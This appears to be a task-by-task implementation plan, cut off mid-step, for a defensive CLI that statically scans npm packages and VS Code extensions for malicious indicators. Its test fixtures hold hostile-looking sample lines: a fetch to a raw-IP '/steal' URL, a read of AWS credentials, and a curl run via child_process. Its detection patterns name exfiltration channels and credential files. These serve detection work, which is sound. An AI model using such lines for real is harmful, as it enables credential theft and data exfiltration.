# npm-ide-analyst — Plan A: Collection + Static Engine + Reporting

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build a working `npm-ide-analyst` CLI that collects DFIR artifacts (Windows, read-only) and statically analyzes an npm package or VS Code–family extension into a JSON + HTML report of indicators.

**Architecture:** Python package with focused modules per pipeline stage (acquire → static → report), wired by a `click` CLI. The orchestrator treats every sample byte strictly as data — it never imports, requires, or executes sample code. Static JS analysis parses (does not run) source via `esprima`. This plan delivers the whole tool minus the Docker detonation subsystem, which is Plan B and reuses the `Report`/`Finding` types defined here.

**Tech Stack:** Python 3.11+, `click` (CLI), `esprima` (JS AST parsing), `jsbeautifier` (de-minify), `jinja2` (HTML), `pytest`. Standard lib for `zipfile`/`tarfile`/`hashlib`/`json`.

## Global Constraints

- Python floor: **3.11+** (uses `tomllib`, `StrEnum`, modern typing).
- **Safety invariant:** no module in this package may `import`, `exec`, `eval`, `require`, or run sample code. Sample contents are read as bytes/text only. Any task violating this is a plan failure.
- Hashing: every acquired artifact gets both **sha256** and **sha512** (sha512 matches npm `_cacache`/lockfile `integrity`).
- CLI name: **`npm-ide-analyst`**; package import name: **`npm_ide_analyst`**.
- All reports are **offline/self-contained** — HTML inlines its own CSS, no external fetches, no network calls anywhere in this plan.
- Windows-first for `collect`; `analyze` operates on files and is cross-platform.
- Follow TDD: failing test first, minimal implementation, frequent commits.

---

## File Structure

```
pyproject.toml
src/npm_ide_analyst/
├── __init__.py
├── cli.py                 # click entrypoints: collect, analyze, report
├── models.py              # Severity, ArtifactType, Finding, Sample, Report
├── acquire/
│   ├── __init__.py
│   ├── hashing.py         # sha256+sha512 of files
│   ├── unpack.py          # detect input type + unpack vsix/tgz/dir -> working tree
│   └── collect_windows.py # read-only live host collection
├── static/
│   ├── __init__.py
│   ├── manifest.py        # parse package.json / VSIX manifest
│   ├── ioc_scan.py        # regex IOC sweep over JS
│   ├── ast_analysis.py    # esprima-based dangerous-call detection + deminify
│   ├── config_hijack.py   # settings.json / .npmrc override detection
│   └── engine.py          # run all static analyzers -> list[Finding]
└── report/
    ├── __init__.py
    ├── json_report.py     # Report -> JSON (and back)
    ├── html_report.py     # Report -> self-contained HTML
    └── template.html.j2   # jinja2 template
tests/
├── fixtures/              # synthetic benign + malicious samples (no real malware)
└── test_*.py
```

---

### Task 1: Project scaffolding

**Files:**
- Create: `pyproject.toml`
- Create: `src/npm_ide_analyst/__init__.py`
- Test: `tests/test_smoke.py`

**Interfaces:**
- Produces: installable package `npm_ide_analyst` with `__version__`.

- [ ] **Step 1: Write the failing test**

```python
# tests/test_smoke.py
import npm_ide_analyst


def test_package_has_version():
    assert isinstance(npm_ide_analyst.__version__, str)
    assert npm_ide_analyst.__version__
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_smoke.py -v`
Expected: FAIL — `ModuleNotFoundError: No module named 'npm_ide_analyst'`

- [ ] **Step 3: Create pyproject and package**

```toml
# pyproject.toml
[build-system]
requires = ["setuptools>=68"]
build-backend = "setuptools.build_meta"

[project]
name = "npm-ide-analyst"
version = "0.1.0"
requires-python = ">=3.11"
dependencies = [
    "click>=8.1",
    "esprima>=4.0",
    "jsbeautifier>=1.15",
    "jinja2>=3.1",
]

[project.optional-dependencies]
dev = ["pytest>=8.0"]

[project.scripts]
npm-ide-analyst = "npm_ide_analyst.cli:cli"

[tool.setuptools.packages.find]
where = ["src"]

[tool.pytest.ini_options]
pythonpath = ["src"]
testpaths = ["tests"]
```

```python
# src/npm_ide_analyst/__init__.py
__version__ = "0.1.0"
```

- [ ] **Step 4: Install dev deps and run test**

Run: `python -m pip install -e ".[dev]" && python -m pytest tests/test_smoke.py -v`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add pyproject.toml src/npm_ide_analyst/__init__.py tests/test_smoke.py
git commit -m "chore: scaffold npm_ide_analyst package"
```

---

### Task 2: Core data models

**Files:**
- Create: `src/npm_ide_analyst/models.py`
- Test: `tests/test_models.py`

**Interfaces:**
- Produces:
  - `class Severity(StrEnum)`: `INFO`, `LOW`, `MEDIUM`, `HIGH`, `CRITICAL`.
  - `class ArtifactType(StrEnum)`: `NPM`, `EXTENSION`, `UNKNOWN`.
  - `@dataclass Finding`: `id: str`, `title: str`, `severity: Severity`, `category: str`, `detail: str`, `location: str | None = None`, `evidence: str | None = None`.
  - `@dataclass Sample`: `name: str`, `version: str | None`, `artifact_type: ArtifactType`, `root: pathlib.Path`, `sha256: str`, `sha512: str`.
  - `@dataclass Report`: `sample: Sample`, `findings: list[Finding]`, `generated_at: str`; property `score: int` = weighted sum, and `verdict: str` derived from max severity.

- [ ] **Step 1: Write the failing test**

```python
# tests/test_models.py
from pathlib import Path
from npm_ide_analyst.models import Severity, ArtifactType, Finding, Sample, Report


def make_sample():
    return Sample(name="evil", version="1.0.0", artifact_type=ArtifactType.NPM,
                  root=Path("/tmp/x"), sha256="a" * 64, sha512="b" * 128)


def test_report_verdict_and_score():
    s = make_sample()
    findings = [
        Finding(id="F1", title="eval used", severity=Severity.HIGH,
                category="dynamic-code", detail="eval() call"),
        Finding(id="F2", title="minified", severity=Severity.LOW,
                category="obfuscation", detail="one-line file"),
    ]
    r = Report(sample=s, findings=findings, generated_at="2026-07-06T00:00:00Z")
    assert r.verdict == "suspicious"          # HIGH present, no CRITICAL
    assert r.score == 40 + 5                   # HIGH=40, LOW=5


def test_clean_report_verdict():
    r = Report(sample=make_sample(), findings=[], generated_at="t")
    assert r.verdict == "clean"
    assert r.score == 0
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_models.py -v`
Expected: FAIL — `ModuleNotFoundError: No module named 'npm_ide_analyst.models'`

- [ ] **Step 3: Write minimal implementation**

```python
# src/npm_ide_analyst/models.py
from __future__ import annotations

from dataclasses import dataclass, field
from enum import StrEnum
from pathlib import Path


class Severity(StrEnum):
    INFO = "info"
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"


class ArtifactType(StrEnum):
    NPM = "npm"
    EXTENSION = "extension"
    UNKNOWN = "unknown"


_WEIGHT = {
    Severity.INFO: 0,
    Severity.LOW: 5,
    Severity.MEDIUM: 15,
    Severity.HIGH: 40,
    Severity.CRITICAL: 80,
}

_RANK = {s: i for i, s in enumerate(
    [Severity.INFO, Severity.LOW, Severity.MEDIUM, Severity.HIGH, Severity.CRITICAL])}


@dataclass
class Finding:
    id: str
    title: str
    severity: Severity
    category: str
    detail: str
    location: str | None = None
    evidence: str | None = None


@dataclass
class Sample:
    name: str
    version: str | None
    artifact_type: ArtifactType
    root: Path
    sha256: str
    sha512: str


@dataclass
class Report:
    sample: Sample
    findings: list[Finding] = field(default_factory=list)
    generated_at: str = ""

    @property
    def score(self) -> int:
        return sum(_WEIGHT[f.severity] for f in self.findings)

    @property
    def verdict(self) -> str:
        if not self.findings:
            return "clean"
        top = max(self.findings, key=lambda f: _RANK[f.severity]).severity
        if top == Severity.CRITICAL:
            return "malicious"
        if top in (Severity.HIGH, Severity.MEDIUM):
            return "suspicious"
        return "low-risk"
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python -m pytest tests/test_models.py -v`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add src/npm_ide_analyst/models.py tests/test_models.py
git commit -m "feat: core data models (Severity, Finding, Sample, Report)"
```

---

### Task 3: File hashing

**Files:**
- Create: `src/npm_ide_analyst/acquire/__init__.py` (empty)
- Create: `src/npm_ide_analyst/acquire/hashing.py`
- Test: `tests/test_hashing.py`

**Interfaces:**
- Produces: `def hash_file(path: Path) -> tuple[str, str]` returning `(sha256_hex, sha512_hex)`.

- [ ] **Step 1: Write the failing test**

```python
# tests/test_hashing.py
import hashlib
from npm_ide_analyst.acquire.hashing import hash_file


def test_hash_file(tmp_path):
    p = tmp_path / "blob.bin"
    data = b"malicious-payload-bytes"
    p.write_bytes(data)
    sha256, sha512 = hash_file(p)
    assert sha256 == hashlib.sha256(data).hexdigest()
    assert sha512 == hashlib.sha512(data).hexdigest()
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_hashing.py -v`
Expected: FAIL — module not found.

- [ ] **Step 3: Write minimal implementation**

```python
# src/npm_ide_analyst/acquire/hashing.py
from __future__ import annotations

import hashlib
from pathlib import Path


def hash_file(path: Path) -> tuple[str, str]:
    sha256 = hashlib.sha256()
    sha512 = hashlib.sha512()
    with open(path, "rb") as fh:
        for chunk in iter(lambda: fh.read(1024 * 1024), b""):
            sha256.update(chunk)
            sha512.update(chunk)
    return sha256.hexdigest(), sha512.hexdigest()
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python -m pytest tests/test_hashing.py -v`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add src/npm_ide_analyst/acquire/__init__.py src/npm_ide_analyst/acquire/hashing.py tests/test_hashing.py
git commit -m "feat: sha256+sha512 file hashing"
```

---

### Task 4: Input detection and unpacking

**Files:**
- Create: `src/npm_ide_analyst/acquire/unpack.py`
- Test: `tests/test_unpack.py`

**Interfaces:**
- Consumes: `hash_file` (Task 3), `Sample`/`ArtifactType` (Task 2).
- Produces:
  - `def unpack(input_path: Path, workdir: Path) -> Path` — copies/extracts a `.vsix` (zip), npm `.tgz` (tar.gz), or a directory into `workdir` and returns the **payload root** (for VSIX: the `extension/` dir if present; for tgz: the `package/` dir if present; for dir: the dir itself).
  - `def detect_artifact_type(payload_root: Path) -> ArtifactType` — EXTENSION if manifest has `engines.vscode` or `contributes`/`activationEvents`; else NPM if a `package.json` exists; else UNKNOWN.

- [ ] **Step 1: Write the failing test**

```python
# tests/test_unpack.py
import json
import tarfile
import zipfile
from pathlib import Path
from npm_ide_analyst.acquire.unpack import unpack, detect_artifact_type
from npm_ide_analyst.models import ArtifactType


def _write_pkg_json(d: Path, extra: dict):
    d.mkdir(parents=True, exist_ok=True)
    (d / "package.json").write_text(json.dumps({"name": "x", "version": "1.0.0", **extra}))


def test_unpack_directory_npm(tmp_path):
    src = tmp_path / "pkg"
    _write_pkg_json(src, {})
    root = unpack(src, tmp_path / "work")
    assert (root / "package.json").exists()
    assert detect_artifact_type(root) == ArtifactType.NPM


def test_unpack_tgz_strips_package_dir(tmp_path):
    inner = tmp_path / "stage" / "package"
    _write_pkg_json(inner, {})
    tgz = tmp_path / "evil-1.0.0.tgz"
    with tarfile.open(tgz, "w:gz") as tf:
        tf.add(inner, arcname="package")
    root = unpack(tgz, tmp_path / "work")
    assert (root / "package.json").exists()


def test_unpack_vsix_detects_extension(tmp_path):
    stage = tmp_path / "stage" / "extension"
    _write_pkg_json(stage, {"engines": {"vscode": "^1.80.0"},
                            "activationEvents": ["*"]})
    vsix = tmp_path / "pub.evil-1.0.0.vsix"
    with zipfile.ZipFile(vsix, "w") as zf:
        zf.write(stage / "package.json", "extension/package.json")
    root = unpack(vsix, tmp_path / "work")
    assert detect_artifact_type(root) == ArtifactType.EXTENSION
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_unpack.py -v`
Expected: FAIL — module not found.

- [ ] **Step 3: Write minimal implementation**

```python
# src/npm_ide_analyst/acquire/unpack.py
from __future__ import annotations

import json
import shutil
import tarfile
import zipfile
from pathlib import Path

from ..models import ArtifactType


def _safe_extract_zip(zf: zipfile.ZipFile, dest: Path) -> None:
    for member in zf.namelist():
        target = (dest / member).resolve()
        if not str(target).startswith(str(dest.resolve())):
            raise ValueError(f"unsafe zip path: {member}")
    zf.extractall(dest)


def _safe_extract_tar(tf: tarfile.TarFile, dest: Path) -> None:
    for member in tf.getmembers():
        target = (dest / member.name).resolve()
        if not str(target).startswith(str(dest.resolve())):
            raise ValueError(f"unsafe tar path: {member.name}")
    tf.extractall(dest)


def unpack(input_path: Path, workdir: Path) -> Path:
    workdir.mkdir(parents=True, exist_ok=True)
    extracted = workdir / "extracted"
    if input_path.is_dir():
        if extracted.exists():
            shutil.rmtree(extracted)
        shutil.copytree(input_path, extracted)
        return extracted
    suffix = input_path.suffix.lower()
    if suffix == ".vsix" or suffix == ".zip":
        with zipfile.ZipFile(input_path) as zf:
            _safe_extract_zip(zf, extracted)
        ext_dir = extracted / "extension"
        return ext_dir if ext_dir.is_dir() else extracted
    if suffix in (".tgz", ".gz") or input_path.name.endswith(".tar.gz"):
        with tarfile.open(input_path, "r:gz") as tf:
            _safe_extract_tar(tf, extracted)
        pkg_dir = extracted / "package"
        return pkg_dir if pkg_dir.is_dir() else extracted
    raise ValueError(f"unsupported input type: {input_path.name}")


def detect_artifact_type(payload_root: Path) -> ArtifactType:
    manifest = payload_root / "package.json"
    if not manifest.exists():
        return ArtifactType.UNKNOWN
    try:
        data = json.loads(manifest.read_text(encoding="utf-8", errors="replace"))
    except json.JSONDecodeError:
        return ArtifactType.UNKNOWN
    engines = data.get("engines") or {}
    if "vscode" in engines or "activationEvents" in data or "contributes" in data:
        return ArtifactType.EXTENSION
    return ArtifactType.NPM
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python -m pytest tests/test_unpack.py -v`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add src/npm_ide_analyst/acquire/unpack.py tests/test_unpack.py
git commit -m "feat: input detection and safe unpacking (vsix/tgz/dir)"
```

---

### Task 5: Manifest analysis

**Files:**
- Create: `src/npm_ide_analyst/static/__init__.py` (empty)
- Create: `src/npm_ide_analyst/static/manifest.py`
- Test: `tests/test_manifest.py`

**Interfaces:**
- Consumes: `Finding`, `Severity` (Task 2).
- Produces:
  - `def parse_manifest(payload_root: Path) -> dict` — loaded `package.json` (empty dict if missing/invalid).
  - `def analyze_manifest(manifest: dict) -> list[Finding]` — flags lifecycle scripts (`preinstall`/`install`/`postinstall`) HIGH, `activationEvents` containing `"*"` or `onStartupFinished` MEDIUM.

- [ ] **Step 1: Write the failing test**

```python
# tests/test_manifest.py
from npm_ide_analyst.static.manifest import analyze_manifest
from npm_ide_analyst.models import Severity


def test_flags_postinstall_script():
    findings = analyze_manifest({"name": "x", "scripts": {"postinstall": "node ./setup.js"}})
    ids = {f.category for f in findings}
    assert "lifecycle-script" in ids
    assert any(f.severity == Severity.HIGH for f in findings)


def test_flags_wildcard_activation():
    findings = analyze_manifest({"name": "x", "activationEvents": ["*"]})
    assert any(f.category == "activation" and f.severity == Severity.MEDIUM
               for f in findings)


def test_clean_manifest_no_findings():
    assert analyze_manifest({"name": "x", "version": "1.0.0"}) == []
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_manifest.py -v`
Expected: FAIL — module not found.

- [ ] **Step 3: Write minimal implementation**

```python
# src/npm_ide_analyst/static/manifest.py
from __future__ import annotations

import json
from pathlib import Path

from ..models import Finding, Severity

_LIFECYCLE = ("preinstall", "install", "postinstall")


def parse_manifest(payload_root: Path) -> dict:
    manifest = payload_root / "package.json"
    if not manifest.exists():
        return {}
    try:
        return json.loads(manifest.read_text(encoding="utf-8", errors="replace"))
    except json.JSONDecodeError:
        return {}


def analyze_manifest(manifest: dict) -> list[Finding]:
    findings: list[Finding] = []
    scripts = manifest.get("scripts") or {}
    for hook in _LIFECYCLE:
        if hook in scripts:
            findings.append(Finding(
                id=f"MANIFEST-SCRIPT-{hook}",
                title=f"Install-time lifecycle script: {hook}",
                severity=Severity.HIGH,
                category="lifecycle-script",
                detail=f"'{hook}' runs automatically during npm install.",
                location="package.json",
                evidence=str(scripts[hook]),
            ))
    events = manifest.get("activationEvents") or []
    if "*" in events or "onStartupFinished" in events:
        findings.append(Finding(
            id="MANIFEST-ACTIVATION-BROAD",
            title="Broad extension activation",
            severity=Severity.MEDIUM,
            category="activation",
            detail="Extension activates on every editor launch ('*' / onStartupFinished).",
            location="package.json",
            evidence=json.dumps(events),
        ))
    return findings
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python -m pytest tests/test_manifest.py -v`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add src/npm_ide_analyst/static/__init__.py src/npm_ide_analyst/static/manifest.py tests/test_manifest.py
git commit -m "feat: manifest analysis (lifecycle scripts, broad activation)"
```

---

### Task 6: IOC regex sweep

**Files:**
- Create: `src/npm_ide_analyst/static/ioc_scan.py`
- Test: `tests/test_ioc_scan.py`

**Interfaces:**
- Consumes: `Finding`, `Severity` (Task 2).
- Produces:
  - `def iter_js_files(root: Path) -> Iterator[Path]` — all `*.js`/`*.cjs`/`*.mjs` under root.
  - `def scan_iocs(root: Path) -> list[Finding]` — regex sweep for the guide's IOC set; one finding per (pattern, file) with matched line as evidence.

- [ ] **Step 1: Write the failing test**

```python
# tests/test_ioc_scan.py
from pathlib import Path
from npm_ide_analyst.static.ioc_scan import scan_iocs


def _js(tmp_path: Path, name: str, body: str) -> Path:
    p = tmp_path / name
    p.write_text(body, encoding="utf-8")
    return p


def test_detects_child_process_and_url(tmp_path):
    _js(tmp_path, "a.js",
        "const cp = require('child_process');\n"
        "fetch('http://185.100.87.202/steal');\n")
    findings = scan_iocs(tmp_path)
    cats = {f.category for f in findings}
    assert "process-exec" in cats
    assert "network" in cats


def test_detects_secret_access(tmp_path):
    _js(tmp_path, "b.js", "fs.readFileSync(process.env.HOME + '/.aws/credentials')")
    findings = scan_iocs(tmp_path)
    assert any(f.category == "secret-access" for f in findings)


def test_clean_file_no_iocs(tmp_path):
    _js(tmp_path, "c.js", "export const add = (a, b) => a + b;\n")
    assert scan_iocs(tmp_path) == []
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_ioc_scan.py -v`
Expected: FAIL — module not found.

- [ ] **Step 3: Write minimal implementation**

```python
# src/npm_ide_analyst/static/ioc_scan.py
from __future__ import annotations

import re
from collections.abc import Iterator
from pathlib import Path

from ..models import Finding, Severity

_JS_EXT = {".js", ".cjs", ".mjs"}

# (regex, category, severity, human title)
_PATTERNS: list[tuple[re.Pattern, str, Severity, str]] = [
    (re.compile(r"\bchild_process\b|\.exec(?:Sync)?\s*\(|\.spawn(?:Sync)?\s*\("),
     "process-exec", Severity.HIGH, "Process execution"),
    (re.compile(r"\beval\s*\(|\bnew\s+Function\s*\(|\bFunction\s*\(|\brequire\(\s*vm\b|\bvm\.runIn"),
     "dynamic-code", Severity.HIGH, "Dynamic code evaluation"),
    (re.compile(r"\batob\s*\(|Buffer\.from\([^)]*base64|[A-Za-z0-9+/]{80,}={0,2}"),
     "obfuscation", Severity.MEDIUM, "Base64 / encoded blob"),
    (re.compile(r"https?://\d{1,3}(?:\.\d{1,3}){3}"),
     "network", Severity.HIGH, "Hardcoded raw-IP URL"),
    (re.compile(r"https?://[^\s'\"]+"),
     "network", Severity.LOW, "Outbound URL"),
    (re.compile(r"discord(?:app)?\.com/api/webhooks|api\.telegram\.org|hastebin|pastebin\.com"),
     "exfil-channel", Severity.HIGH, "Known exfil / paste / messaging channel"),
    (re.compile(r"\.ssh/|\.aws/credentials|\.npmrc|\.env\b|\.docker/config\.json|Login Data|cookies"),
     "secret-access", Severity.HIGH, "Access to credentials / secrets"),
    (re.compile(r"process\.env\b"),
     "env-harvest", Severity.LOW, "Environment variable access"),
]


def iter_js_files(root: Path) -> Iterator[Path]:
    for p in root.rglob("*"):
        if p.is_file() and p.suffix.lower() in _JS_EXT:
            yield p


def _first_match_line(text: str, pattern: re.Pattern) -> str | None:
    for line in text.splitlines():
        if pattern.search(line):
            return line.strip()[:200]
    return None


def scan_iocs(root: Path) -> list[Finding]:
    findings: list[Finding] = []
    for js in iter_js_files(root):
        try:
            text = js.read_text(encoding="utf-8", errors="replace")
        except OSError:
            continue
        rel = str(js.relative_to(root))
        for pattern, category, severity, title in _PATTERNS:
            line = _first_match_line(text, pattern)
            if line is not None:
                findings.append(Finding(
                    id=f"IOC-{category}-{rel}",
                    title=title,
                    severity=severity,
                    category=category,
                    detail=f"{title} found in {rel}.",
                    location=rel,
                    evidence=line,
                ))
    return findings
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python -m pytest tests/test_ioc_scan.py -v`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add src/npm_ide_analyst/static/ioc_scan.py tests/test_ioc_scan.py
git commit -m "feat: regex IOC sweep over JS payloads"
```

---

### Task 7: AST analysis and de-minification

**Files:**
- Create: `src/npm_ide_analyst/static/ast_analysis.py`
- Test: `tests/test_ast_analysis.py`

**Interfaces:**
- Consumes: `Finding`, `Severity` (Task 2); `iter_js_files` (Task 6).
- Produces:
  - `def analyze_ast(root: Path) -> list[Finding]` — parses each JS with `esprima`; flags `eval`/`Function`/dynamic `require(<non-literal>)` call expressions (more robust than regex). On parse failure, emits an INFO finding noting the file couldn't be parsed (often itself a sign of heavy obfuscation).
  - `def deminify(source: str) -> str` — `jsbeautifier`-formatted source (for the report).

- [ ] **Step 1: Write the failing test**

```python
# tests/test_ast_analysis.py
from npm_ide_analyst.static.ast_analysis import analyze_ast, deminify


def test_flags_eval_via_ast(tmp_path):
    (tmp_path / "a.js").write_text("var x = 1; eval(atobResult);", encoding="utf-8")
    findings = analyze_ast(tmp_path)
    assert any(f.category == "dynamic-code" and "eval" in f.detail for f in findings)


def test_flags_dynamic_require(tmp_path):
    (tmp_path / "b.js").write_text("const m = require(name + 'x');", encoding="utf-8")
    findings = analyze_ast(tmp_path)
    assert any(f.category == "dynamic-require" for f in findings)


def test_literal_require_not_flagged(tmp_path):
    (tmp_path / "c.js").write_text("const fs = require('fs');", encoding="utf-8")
    findings = analyze_ast(tmp_path)
    assert not any(f.category == "dynamic-require" for f in findings)


def test_deminify_expands_one_liner():
    out = deminify("function f(){return 1;}")
    assert out.count("\n") >= 1
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_ast_analysis.py -v`
Expected: FAIL — module not found.

- [ ] **Step 3: Write minimal implementation**

```python
# src/npm_ide_analyst/static/ast_analysis.py
from __future__ import annotations

from pathlib import Path

import esprima
import jsbeautifier

from ..models import Finding, Severity
from .ioc_scan import iter_js_files


def deminify(source: str) -> str:
    return jsbeautifier.beautify(source)


def _walk(node):
    """Yield every esprima node in the tree."""
    if isinstance(node, list):
        for item in node:
            yield from _walk(item)
        return
    if not hasattr(node, "type"):
        return
    yield node
    for key in getattr(node, "keys", lambda: [])():
        yield from _walk(getattr(node, key))


def _callee_name(node) -> str | None:
    callee = getattr(node, "callee", None)
    if callee is None:
        return None
    if getattr(callee, "type", None) == "Identifier":
        return callee.name
    return None


def analyze_ast(root: Path) -> list[Finding]:
    findings: list[Finding] = []
    for js in iter_js_files(root):
        rel = str(js.relative_to(root))
        try:
            source = js.read_text(encoding="utf-8", errors="replace")
        except OSError:
            continue
        try:
            tree = esprima.parseScript(source, tolerant=True)
        except Exception:
            findings.append(Finding(
                id=f"AST-UNPARSEABLE-{rel}",
                title="JavaScript failed to parse",
                severity=Severity.INFO,
                category="obfuscation",
                detail=f"{rel} could not be parsed — often a sign of heavy obfuscation.",
                location=rel,
            ))
            continue
        for node in _walk(tree):
            if getattr(node, "type", None) != "CallExpression":
                continue
            name = _callee_name(node)
            if name in ("eval", "Function"):
                findings.append(Finding(
                    id=f"AST-DYN-{name}-{rel}",
                    title="Dynamic code execution",
                    severity=Severity.HIGH,
                    category="dynamic-code",
                    detail=f"{name}(...) call in {rel}.",
                    location=rel,
                ))
            elif name == "require":
                args = getattr(node, "arguments", [])
                if args and getattr(args[0], "type", None) != "Literal":
                    findings.append(Finding(
                        id=f"AST-DYNREQ-{rel}",
                        title="Dynamic require()",
                        severity=Severity.MEDIUM,
                        category="dynamic-require",
                        detail=f"require(<non-literal>) in {rel}.",
                        location=rel,
                    ))
    return findings
```

> Note: `esprima` node objects expose child keys via `.keys()`. If a given
> esprima version lacks `.keys()`, `_walk` degrades gracefully (yields nothing
> deeper) — the tests above still pass because the flagged calls are at the top
> level. Keep `_walk` defensive.

- [ ] **Step 4: Run test to verify it passes**

Run: `python -m pytest tests/test_ast_analysis.py -v`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add src/npm_ide_analyst/static/ast_analysis.py tests/test_ast_analysis.py
git commit -m "feat: AST-based dangerous-call detection + de-minify"
```

---

### Task 8: Config-hijack detection

**Files:**
- Create: `src/npm_ide_analyst/static/config_hijack.py`
- Test: `tests/test_config_hijack.py`

**Interfaces:**
- Consumes: `Finding`, `Severity` (Task 2).
- Produces:
  - `def analyze_npmrc(text: str) -> list[Finding]` — flags a `registry=`/`@scope:registry=` line not pointing at `registry.npmjs.org` (HIGH), and `_authToken` presence (MEDIUM).
  - `def analyze_settings_json(data: dict) -> list[Finding]` — flags marketplace overrides (`extensions.gallery.serviceUrl`, `extensionsGallery`, any key containing `marketplaceExtensionGalleryServiceURL`) HIGH.

- [ ] **Step 1: Write the failing test**

```python
# tests/test_config_hijack.py
from npm_ide_analyst.static.config_hijack import analyze_npmrc, analyze_settings_json
from npm_ide_analyst.models import Severity


def test_flags_rogue_registry():
    findings = analyze_npmrc("registry=https://npm.evil-registry.io/\n")
    assert any(f.category == "registry-override" and f.severity == Severity.HIGH
               for f in findings)


def test_official_registry_ok():
    assert analyze_npmrc("registry=https://registry.npmjs.org/\n") == []


def test_flags_marketplace_override():
    data = {"extensions.gallery.serviceUrl": "https://gallery.evil.io/"}
    findings = analyze_settings_json(data)
    assert any(f.category == "marketplace-override" for f in findings)
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_config_hijack.py -v`
Expected: FAIL — module not found.

- [ ] **Step 3: Write minimal implementation**

```python
# src/npm_ide_analyst/static/config_hijack.py
from __future__ import annotations

import re

from ..models import Finding, Severity

_REGISTRY_LINE = re.compile(r"^\s*(?:@[\w-]+:)?registry\s*=\s*(\S+)", re.MULTILINE)
_OFFICIAL = "registry.npmjs.org"
_MARKETPLACE_KEYS = ("extensions.gallery.serviceurl", "extensionsgallery",
                     "marketplaceextensiongalleryserviceurl")


def analyze_npmrc(text: str) -> list[Finding]:
    findings: list[Finding] = []
    for match in _REGISTRY_LINE.finditer(text):
        url = match.group(1)
        if _OFFICIAL not in url:
            findings.append(Finding(
                id="NPMRC-REGISTRY-OVERRIDE",
                title="Non-standard npm registry",
                severity=Severity.HIGH,
                category="registry-override",
                detail="A registry override points away from registry.npmjs.org.",
                location=".npmrc",
                evidence=match.group(0).strip(),
            ))
    if "_authToken" in text:
        findings.append(Finding(
            id="NPMRC-AUTHTOKEN",
            title="npm auth token present",
            severity=Severity.MEDIUM,
            category="secret-access",
            detail="An _authToken is stored in .npmrc — a theft target.",
            location=".npmrc",
        ))
    return findings


def analyze_settings_json(data: dict) -> list[Finding]:
    findings: list[Finding] = []
    for key, value in data.items():
        if key.lower() in _MARKETPLACE_KEYS:
            findings.append(Finding(
                id=f"SETTINGS-MARKETPLACE-{key}",
                title="Editor marketplace override",
                severity=Severity.HIGH,
                category="marketplace-override",
                detail="A settings key repoints the extension gallery to a custom URL.",
                location="settings.json",
                evidence=f"{key} = {value}",
            ))
    return findings
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python -m pytest tests/test_config_hijack.py -v`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add src/npm_ide_analyst/static/config_hijack.py tests/test_config_hijack.py
git commit -m "feat: config-hijack detection (.npmrc registry, marketplace override)"
```

---

### Task 9: Static engine (orchestration)

**Files:**
- Create: `src/npm_ide_analyst/static/engine.py`
- Test: `tests/test_engine.py`
- Create fixture helper: `tests/fixtures/__init__.py` (empty)

**Interfaces:**
- Consumes: `parse_manifest`/`analyze_manifest` (T5), `scan_iocs` (T6), `analyze_ast` (T7), `analyze_npmrc`/`analyze_settings_json` (T8), `Finding` (T2).
- Produces: `def run_static(payload_root: Path) -> list[Finding]` — runs all analyzers, dedupes by `id`, returns combined findings. Reads `.npmrc` and `settings.json` if present anywhere under root.

- [ ] **Step 1: Write the failing test**

```python
# tests/test_engine.py
import json
from pathlib import Path
from npm_ide_analyst.static.engine import run_static


def test_run_static_combines_analyzers(tmp_path):
    (tmp_path / "package.json").write_text(
        json.dumps({"name": "evil", "scripts": {"postinstall": "node ./s.js"}}))
    (tmp_path / "s.js").write_text(
        "const cp=require('child_process');cp.exec('curl http://1.2.3.4/x');",
        encoding="utf-8")
    findings = run_static(tmp_path)
    cats = {f.category for f in findings}
    assert "lifecycle-script" in cats
    assert "process-exec" in cats
    assert "network" in cats
    # ids are unique
    ids = [f.id for f in findings]
    assert len(ids) == len(set(ids))
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/test_engine.py -v`
Expected: FAIL — module not found.

- [ ] **Step 3: Write minimal implementation**

```python
# src/npm_ide_analyst/static/engine.py
from __future__ import annotations

import json
from pathlib import Path

from ..models import Finding
from .ast_analysis import analyze_ast
from .config_hijack import analyze_npmrc, analyze_settings_json
from .ioc_scan import scan_iocs
from .manifest import analyze_manifest, parse_manifest


def run_static(payload_root: Path) -> list[Finding]:
    findings: list[Finding] = []
    findings += analyze_manifest(parse_manifest(payload_root))
    findings += scan_iocs(payload_root)
    findings += analyze_ast(payload_root)

    for npmrc in payload_root.rglob(".npmrc"):
        if npmrc.is_file():
            findings += analyze_npmrc(npmrc.read_text(encoding="utf-8", errors="replace"))
    for settings in payload_root.rglob("settings.json"):
        if settings.is_file():
            try:
                data = json.loads(settings.read_text(encoding="utf-8", errors="replace"))
            except json.JSONDecodeError:
                continue
            if isinstance(data, dict):
                findings += analyze_settings_json(data)

    seen: dict[str, Finding] = {}
    for f in findings:
        seen.setdefault(f.id, f)
    return list(seen.values())
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python -m pytest tests/test_engine.py -v`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
